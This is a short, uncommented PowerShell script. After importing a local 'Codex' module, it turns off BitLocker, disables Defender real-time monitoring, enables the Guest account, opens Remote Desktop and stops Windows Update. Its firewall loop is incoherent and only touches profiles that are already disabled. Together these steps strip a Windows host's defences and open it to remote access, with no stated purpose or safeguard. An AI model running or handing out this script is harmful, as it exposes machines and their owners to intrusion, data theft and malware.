param (

)

$ErrorActionPreference = 'Stop'

# Import the Codex module
$pwd = $MyInvocation.MyCommand.Path
$modulePath = Join-Path ($pwd -replace '[^\\/]+$', '') "Codex" -AdditionalChildPath @("Codex.psm1")
Import-Module $modulePath -Force

Disable-Bitlocker -DriveLetter C
Set-MpPreference -DisableHttpParsing $true
Set-MpPreference -DisableRealtimeMonitoring $true
Enable-LocalUser -Name 'Guest'
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0



$firewall = Get-NetFirewallProfile

$firewall | ForEach-Object {
    if ($_.Enabled -eq 'False')
    {
        Set-NetFirewallProfile -Profile $_.Name -Enabled $false
    }
}

Get-Service -Name wuauserv | Stop-Service